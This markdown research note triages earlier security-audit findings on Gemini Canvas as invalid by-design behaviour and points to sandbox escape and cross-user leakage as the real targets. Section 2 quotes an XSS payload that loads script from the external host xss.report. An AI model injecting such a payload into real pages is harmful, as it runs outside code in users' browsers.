# INVALID FINDINGS - DO NOT REPEAT THESE AREAS

**Date:** 2026-02-17  
**Purpose:** Document invalid research areas to prevent future AI from repeating the same mistakes

---

## ❌ INVALID FINDING CATEGORIES

All findings from previous audits were **INVALID** because they misunderstood the security model of Gemini Canvas.

### 1. JWT/Token "Exposure" - NOT A VULNERABILITY ❌

**What was incorrectly reported:**
- JWT tokens exposed in `window.__initial_auth_token`
- Firebase configuration exposed in `window.__firebase_config`
- Claims: "Token theft", "credential exposure", "session hijacking"

**Why this is INVALID:**
- ✅ These are **service account JWTs** with **configured claims**
- ✅ **By Design** - not account credentials
- ✅ Claims are properly configured to limit scope
- ✅ No security impact - this is how the system is designed to work

**DO NOT report:**
- Token exposure in window globals
- Firebase config visibility
- JWT in HTML/JavaScript
- "Stolen tokens can attack Google infrastructure" - NO, claims prevent this

---

### 2. XSS in Canvas DOM - NOT A VULNERABILITY ❌

**What was incorrectly reported:**
- XSS payload found (e.g., `<script src="https://xss.report/c/nyxsec"></script>`)
- DOM manipulation vulnerabilities
- innerHTML usage without sanitization
- Claims: "Active exploitation", "code execution", "account compromise"

**Why this is INVALID:**
- ✅ Canvas is **rendered by SCF (Sandbox Content Frame)** with sandbox origin
- ✅ **By Design** - canvas is meant to render User Generated Content (UGC)
- ✅ XSS in canvas does NOT break out of sandbox
- ✅ No security impact - isolated execution context

**DO NOT report:**
- XSS in generated canvas content
- Script injection in DOM
- "Active XSS exploitation" - this is intentional rendering
- Unsafe DOM manipulation in UGC context

---

### 3. postMessage Wildcard Origin (`'*'`) - NOT A VULNERABILITY ❌

**What was incorrectly reported:**
- postMessage using wildcard `'*'` origin
- "Any parent can intercept messages"
- Claims: "Message interception", "data theft", "MITM attacks"

**Why this is INVALID:**
- ✅ **By Design** for UGC rendering flexibility
- ✅ Canvas needs to communicate with embedding contexts
- ✅ Self-contained execution - user attacking themselves
- ✅ No cross-user impact

**DO NOT report:**
- Wildcard postMessage as vulnerability
- "Origin validation bypass" in UGC context
- Message interception between parent/child in same-user context

---

### 4. "Weak" Cryptography in Client-Side Code - NOT A VULNERABILITY ❌

**What was incorrectly reported:**
- Math.random() used for EventID generation
- "Predictable RNG", "weak entropy"
- Claims: "Port hijacking", "event spoofing"

**Why this is INVALID:**
- ✅ Client-side event IDs don't need cryptographic strength
- ✅ Security boundary is server-side, not client
- ✅ No security impact if EventID predicted - it's same-user context

**DO NOT report:**
- Math.random() usage in non-security contexts
- Client-side entropy issues
- EventID predictability

---

### 5. Race Conditions in Client-Side State - NOT A VULNERABILITY ❌

**What was incorrectly reported:**
- TOCTOU in IndexedDB _poll()
- Race conditions in Service Worker registration
- Claims: "Database poisoning", "credential corruption"

**Why this is INVALID:**
- ✅ Client-side state is user's own data
- ✅ User can manipulate their own IndexedDB directly anyway
- ✅ No cross-user impact
- ✅ "Self-harm" - user attacking themselves

**DO NOT report:**
- Client-side race conditions
- IndexedDB manipulation by same user
- LocalStorage/SessionStorage races

---

### 6. Missing Client-Side Security Controls - NOT A VULNERABILITY ❌

**What was incorrectly reported:**
- No CSP headers
- No SRI on external scripts
- Missing origin validation
- Claims: "Supply chain attacks", "script tampering"

**Why this is INVALID:**
- ✅ Client-side controls are defense-in-depth, not security boundaries
- ✅ Server-side validation is the actual security control
- ✅ UGC canvas intentionally loads external content

**DO NOT report:**
- Missing CSP in UGC contexts
- Lack of SRI on scripts
- "External script loading" in UGC environment

---

### 7. "Infrastructure Impact" via Client-Side Bugs - NOT A VULNERABILITY ❌

**What was incorrectly reported:**
- "Cascade exploitation" from client bugs to infrastructure
- "Stolen tokens used to attack Google APIs"
- Claims: "Infrastructure compromise", "cross-user attacks"

**Why this is INVALID:**
- ✅ Service account JWT claims prevent infrastructure abuse
- ✅ Server-side rate limiting and validation in place
- ✅ Cannot affect other users or Google infrastructure
- ✅ Client-side bugs in UGC context are isolated

**DO NOT report:**
- Client-side bugs as "infrastructure vulnerabilities"
- Cascade attacks through properly configured JWTs
- "Google API abuse via stolen tokens" - claims prevent this

---

## ✅ WHAT TO ACTUALLY LOOK FOR

Since the canvas is a **UGC rendering sandbox by design**, real vulnerabilities would be:

### Potential Real Vulnerabilities (If They Exist):

1. **Sandbox Escape**
   - Actual breaking out of SCF sandbox
   - Access to parent origin from sandboxed iframe
   - CSP bypass in sandbox context

2. **Server-Side Issues** (if visible in code)
   - Backend API vulnerabilities
   - Server-side validation bypasses
   - Authentication/authorization flaws in backend

3. **Cross-User Data Leakage**
   - One user accessing another user's canvas data
   - Shared state between different user contexts
   - Actual cross-origin data access

4. **Google Infrastructure Abuse**
   - Bypassing service account JWT claim restrictions
   - Actual API rate limit bypass (server-side)
   - Quota manipulation affecting other users

5. **Unintended Information Disclosure**
   - Leaking data that should not be in client code
   - Exposure of actual production secrets (not service account JWTs)
   - Backend implementation details that enable attacks

---

## 🚫 INVALID RESEARCH PATTERNS TO AVOID

**DON'T:**
- ❌ Analyze client-side code as if it's server-side
- ❌ Treat UGC rendering features as vulnerabilities
- ❌ Report "by design" features as bugs
- ❌ Ignore the security model (SCF sandbox, service account JWTs)
- ❌ Claim client-side bugs affect infrastructure without proof
- ❌ Report self-harm scenarios (user attacking themselves)

**DO:**
- ✅ Understand the security boundaries (client vs server)
- ✅ Recognize UGC sandbox model
- ✅ Look for actual cross-user or infrastructure impact
- ✅ Verify claims and scopes of service account JWTs
- ✅ Focus on real security boundaries, not implementation details

---

## 📝 SUMMARY FOR FUTURE AI/RESEARCHERS

**Key Understanding:**

1. **Gemini Canvas = UGC Sandbox**
   - Designed to run untrusted user code
   - XSS, script injection, DOM manipulation are EXPECTED
   - Isolated via SCF sandbox origin

2. **Service Account JWTs ≠ User Credentials**
   - Configured claims limit what can be done
   - Exposure is by design, not a vulnerability
   - Cannot be used to attack infrastructure

3. **Client-Side ≠ Server-Side**
   - Client code can be manipulated by user
   - Security boundary is server-side validation
   - Client-side "vulnerabilities" are often just implementation

4. **Self-Harm ≠ Vulnerability**
   - User manipulating their own data/context is not a bug
   - Cross-user impact is required for real vulnerability
   - Sandbox isolation prevents escalation

**If you're analyzing this code again:**
- Start by understanding the security model
- Don't repeat the invalid findings listed above
- Look for ACTUAL security boundaries being broken
- Verify any claims about infrastructure impact

---

**Status:** All previous findings invalidated  
**Reason:** Misunderstood security model, reported design features as bugs  
**Next Steps:** Restart research with correct understanding

---

*This file serves as a reference to prevent repeating invalid research areas.*
